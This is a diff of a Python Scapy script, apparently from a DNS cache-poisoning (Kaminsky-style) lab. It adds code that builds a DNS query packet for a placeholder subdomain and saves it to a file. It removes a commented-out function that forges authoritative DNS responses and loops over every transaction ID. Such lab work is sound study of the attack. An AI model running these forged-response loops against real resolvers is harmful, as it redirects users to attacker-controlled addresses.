@@ -1,50 +1,18 @@
-# from scapy.all import *
-#
-# def send_spoofed_response(dns_id):
-#     # Details of the forged DNS response
-#     name = 'www.attacker32.com'
-#     fake_ip = '1.2.3.4'  # The fake IP to return
-#
-#     # Construct DNS response (spoofed)
-#     dns_response = (
-#         IP(dst="10.9.0.53", src="10.9.0.153") /  # Send to local DNS server from attacker's nameserver
-#         UDP(dport=53, sport=53) /  # Use DNS port
-#         DNS(
-#             id=dns_id,  # The transaction ID you guessed
-#             qr=1,  # This is a response
-#             aa=1,  # Authoritative answer
-#             qd=DNSQR(qname=name),  # The query section
-#             an=DNSRR(rrname=name, ttl=10, rdata=fake_ip),  # The answer section with the spoofed IP
-#         )
-#     )
-#
-#     # Send the response
-#     send(dns_response)
-#
-# if __name__ == "__main__":
-#     # Loop through a wide range of transaction IDs
-#     for dns_id in range(0x0000, 0xFFFF):  # Guess transaction IDs
-#         send_spoofed_response(dns_id)
-
 from scapy.all import *
-import string
-import random
-
 from scapy.layers.dns import DNS, DNSQR
 from scapy.layers.inet import UDP, IP
 
 
 def send_dns_request():
-    dns_request = IP(dst="10.9.0.53", src = "10.9.0.1") / UDP(sport=RandShort(), dport=53) / DNS(id=0xAAAA,qr=0, qdcount=1, ancount=0, nscount=0,arcount=0, qd=DNSQR(qname="abcde.example.com"))
-    # Save the DNS request to a binary file
-    with open("ip_req.bin", "wb") as file:
-        file.write(bytes(dns_request))
+    Qdsec = DNSQR(qname="abcde.example.com")    # abcde - placeholder for random subdomain
+    dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0,arcount=0, qd=Qdsec)
+    ip = IP(dst="10.9.0.53", src = "10.9.0.1") # dst is the local DNS server, src is the attacker
+    udp = UDP(dport=53, sport=RandShort(), chksum=0) # dport is the DNS port - 53
+    request = ip/udp/dns
     
-    # print(f"Sending DNS request for {qname} to 10.9.0.53")
-    # send(dns_request, verbose=0)
-
+    # Save the request to a binary file
+    with open("ip_req.bin", "wb") as file:
+        file.write(bytes(request))
 
 if __name__ == "__main__":
-    # while True:
     send_dns_request()
-        # time.sleep(0.1)  # Add a small delay to avoid flooding
